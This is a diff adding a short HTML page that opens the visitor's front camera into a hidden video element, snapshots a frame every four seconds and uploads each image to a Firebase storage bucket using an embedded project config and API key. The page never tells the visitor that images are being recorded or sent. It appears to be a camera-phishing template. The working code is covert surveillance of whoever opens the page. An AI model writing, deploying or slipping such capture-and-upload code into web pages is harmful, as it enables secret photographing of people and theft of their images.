@@ -1,0 +1,86 @@
+<!doctype html>
+<html>
+
+<head>
+  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <script type="module">
+    // Import Firebase SDKs
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-app.js";
+    import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-storage.js";
+
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyC215CENkjkGMvlDbQ7yb9S8wiQbArr3oo",
+      authDomain: "my-netlify.firebaseapp.com",
+      projectId: "my-netlify",
+      storageBucket: "my-netlify.appspot.com",
+      messagingSenderId: "113115899130",
+      appId: "1:113115899130:web:2f2b5b1741de0b6564d543",
+      measurementId: "G-FJ1SZZ31VZ"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const storage = getStorage(app);
+
+    document.addEventListener("DOMContentLoaded", () => {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const context = canvas.getContext('2d');
+
+      const constraints = {
+        video: { facingMode: "user" }
+      };
+
+      // Access webcam
+      async function initCamera() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia(constraints);
+          video.srcObject = stream;
+        } catch (e) {
+          console.error('Error accessing webcam: ', e);
+        }
+      }
+
+      // Capture image and upload to Firebase every 4 seconds
+      setInterval(() => {
+        // Draw the current frame from video to canvas
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Convert canvas to Blob
+        canvas.toBlob(async (blob) => {
+          // Create a reference to Firebase Storage
+          const timestamp = Date.now();
+          const imageRef = ref(storage, `images/${timestamp}.png`);
+
+          // Upload the blob (image) to Firebase Storage
+          try {
+            await uploadBytes(imageRef, blob);
+            console.log('Image uploaded successfully:', timestamp);
+          } catch (error) {
+            console.error('Error uploading image:', error);
+          }
+        }, 'image/png');
+      }, 4000); // Capture image every 4 seconds
+
+      // Initialize camera on page load
+      initCamera();
+    });
+  </script>
+</head>
+
+<body>
+  <div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+  </div>
+  <center>
+    <canvas id="canvas" width="640" height="480"></canvas>
+  </center>
+
+  <div class="bottom-bar">
+    <!-- Your existing bottom bar elements -->
+  </div>
+</body>
+
+</html>
